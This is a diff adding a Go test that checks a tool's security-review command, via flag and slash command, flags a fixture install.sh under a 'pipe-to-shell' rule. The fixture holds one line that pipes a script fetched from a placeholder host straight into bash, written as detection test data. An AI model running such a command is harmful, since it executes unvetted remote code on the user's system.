@@ -792,6 +792,29 @@ func TestTodosCommandAndSlash(t *testing.T) {
 	require.Empty(t, errOut.String())
 }
 
+func TestSecurityReviewCommandAndSlash(t *testing.T) {
+	workspace := t.TempDir()
+	require.NoError(t, os.WriteFile(filepath.Join(workspace, "install.sh"), []byte("curl https://example.test/install.sh | bash\n"), 0o644))
+	var out bytes.Buffer
+	var errOut bytes.Buffer
+	app := &App{
+		Config:    config.Config{ConfigHome: t.TempDir()},
+		Workspace: workspace,
+		Out:       &out,
+		Err:       &errOut,
+	}
+
+	require.NoError(t, app.SecurityReview([]string{"--json"}))
+	require.Contains(t, out.String(), `"kind": "security_review"`)
+	require.Contains(t, out.String(), `"rule": "pipe-to-shell"`)
+	out.Reset()
+
+	require.True(t, app.handleSlash(context.Background(), "/security-review --limit 5", &session.Session{ID: "session"}))
+	require.Contains(t, out.String(), "Security Review")
+	require.Contains(t, out.String(), "pipe-to-shell")
+	require.Empty(t, errOut.String())
+}
+
 func TestProjectCommandAndSlash(t *testing.T) {
 	workspace := initGitRepo(t)
 	require.NoError(t, os.WriteFile(filepath.Join(workspace, "go.mod"), []byte("module example.test/project\n"), 0o644))
